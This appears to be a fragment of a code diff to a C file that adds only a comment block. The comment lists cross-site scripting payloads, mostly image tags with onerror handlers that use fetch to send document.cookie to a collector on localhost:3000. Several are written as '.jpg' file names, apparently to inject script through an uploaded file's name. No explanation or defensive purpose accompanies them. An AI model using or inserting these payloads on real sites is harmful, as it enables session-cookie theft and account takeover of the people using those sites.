@@ -244,3 +244,14 @@ char ** get_files_array(char *dir_name) {
 
 }
 
+/*
+<img src=x onerror=alert(1)>.jpg' />
+  "<p>"fetch(`http://localhost:3000/cookie/${document.cookie}`)"</p>"
+    "<img width="0" height="0"><img  width="0" height="0" src=x onerror=fetch(`http://localhost:3000/cookie/${document.cookie}`)>.jpg' /></img>"
+
+
+ "<img src ='x' width='0' height='0' ><img src ='x' width ='0' height ='0' onerror='fetch(`http://localhost:3000/cookie/${document.cookie}`'/></img>"
+
+ "`<p src ='x' width='0' height='0' ><img src ='x' width ='0' height ='0' onerror='fetch(`http://localhost:3000/cookie/${document.cookie}`'/></p>"
+
+ */
